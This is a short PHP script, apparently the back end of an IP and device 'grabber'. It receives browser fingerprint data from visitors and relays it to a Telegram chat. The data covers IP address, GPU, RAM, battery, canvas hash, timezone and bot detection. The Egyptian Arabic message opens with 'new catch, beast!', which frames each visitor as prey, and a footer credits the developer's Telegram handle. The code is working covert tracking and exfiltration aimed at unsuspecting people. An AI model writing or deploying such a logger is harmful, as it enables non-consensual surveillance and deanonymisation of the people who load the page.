<?php
require_once 'config.php';
require_once 'telegram.php';

$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $ip = explode(',', $ip)[0];
    date_default_timezone_set('Africa/Cairo');
    $time = date('h:i:s A');

    // تنسيق الرسالة بالمصري "الروقان"
    $msg = "🎯 <b>صيد جديد يا وحش!</b>\n\n";
    $msg .= "🌐 <b>الـ IP:</b> <code>$ip</code>\n";
    $msg .= "⏰ <b>الساعة:</b> $time\n\n";
    
    $msg .= "📱 <b>الجهاز والنظام:</b>\n";
    $msg .= "• النظام: {$data['platform']}\n";
    $msg .= "• الشاشة: {$data['availScreen']} (Ratio: {$data['pixelRatio']})\n";
    $msg .= "• اللغات: {$data['languages']}\n\n";

    $msg .= "⚙️ <b>الهاردوير:</b>\n";
    $msg .= "• المعالج: {$data['cores']} Cores\n";
    $msg .= "• الرام: {$data['ram']} GB\n";
    $msg .= "• كارت الشاشة: <code>{$data['gpu']}</code>\n";
    $msg .= "• البطارية: {$data['battery']} (شاحن: {$data['charging']})\n\n";

    $msg .= "🌐 <b>الشبكة والبيئة:</b>\n";
    $msg .= "• نوع الاتصال: {$data['connType']} ({$data['downlink']})\n";
    $msg .= "• التوقيت: {$data['tz']}\n\n";

    $msg .= "🔍 <b>كشف التزوير (Anti-Bot):</b>\n";
    $msg .= "• بصمة الكانفاس: <code>" . substr($data['canvasHash'], 0, 15) . "...</code>\n";
    $msg .= "• بوت (Webdriver): " . ($data['webdriver'] ? "⚠️ بوت مكشوف" : "✅ مستخدم حقيقي") . "\n";
    $msg .= "• اللمس (Touch): {$data['touch']} Points\n\n";

    $msg .= "—\n";
    $msg .= "👨‍💻 <a href='https://t.me/" . DEV_USERNAME . "'>" . DEV_USERNAME . "</a>";

    sendTelegramMessage($msg);
}
